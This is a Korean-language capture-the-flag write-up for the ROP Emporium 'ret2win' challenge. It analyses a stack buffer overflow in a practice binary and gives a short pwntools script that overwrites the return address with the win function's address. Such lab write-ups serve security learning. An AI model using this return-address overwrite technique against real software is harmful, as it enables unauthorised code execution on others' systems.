https://ropemporium.com/challenge/ret2win.html

### 🍞 개념

---

### 🔎 코드 분석

---

C 코드를 주지 않고 어셈블리만 주는 타입의 문제
<img width="1026" height="268" alt="image" src="https://github.com/user-attachments/assets/59c8702f-8deb-4202-a458-567bd8a5fe2f" />

NX 말고 켜져있는게 없다

하지만 NX가 켜져있기에 셸코드 주입이 불가능하다


disass 해보자 (ㅠㅠ)

<img width="864" height="844" alt="image" src="https://github.com/user-attachments/assets/8be66d43-123a-4357-b842-037b93271b08" />


코드가 길지 않다. 대충 뇌에 열심히 힘을 주면 알아낼 수 있다.

그러나 함수가 여러개인 것 같은데 심볼 찾기가 힘들다. 조만간 슬슬 화나는 일이 발생할 것 같으니 교수님 말대로 기드라를 까는 방법을 찾아내보자 (ㅠㅠ)

<img width="850" height="204" alt="image" src="https://github.com/user-attachments/assets/48bc8131-5e96-43f5-80d6-b41eb6c9ac74" />

`0x20` 크기의 버퍼에 `0x38`만큼 입력을 받는 것 같다.

버퍼 오버플로우가 가능하다

`ret2win` 함수를 디스어셈블 해보자
<img width="888" height="414" alt="image" src="https://github.com/user-attachments/assets/7a843336-babf-4be7-94d2-ba8c4b514705" />

`system` 함수를 호출하는 것을 알 수 있다.

### 🗡️ 익스플로잇

---

카나리도 없기 때문에 RET을 `ret2win` 함수의 주소로 덮어씌우는 방식이 제일 쉬워보인다.

<img width="656" height="780" alt="image" src="https://github.com/user-attachments/assets/8cd007c2-7e6d-43fd-bb0d-f21afc5b95d1" />

`ret2win`의 주소는 `0x400756`

```python
from pwn import *

p = process("./ret2win")
elf = ELF("./ret2win")

ret2win = elf.symbols['ret2win']
exploit = b'A'*0x20 + b'B'*8 + p64(ret2win)

p.sendline(exploit)

print(p.recvall(timeout=2).decode(errors='replace'))
```

이제 다시 또 스택 구조를 그려보자.

<img width="1044" height="1000" alt="image" src="https://github.com/user-attachments/assets/6abba88f-e25b-49c5-b996-da46e2ed5f20" />

easy

익스플로잇 작성하자

```python
from pwn import *

p = process("./ret2win")
elf = ELF("./ret2win")

ret2win = elf.symbols['ret2win']
exploit = b'A'*0x20 + b'B'*8 + p64(ret2win)

p.sendline(exploit)

p.interactive()
```
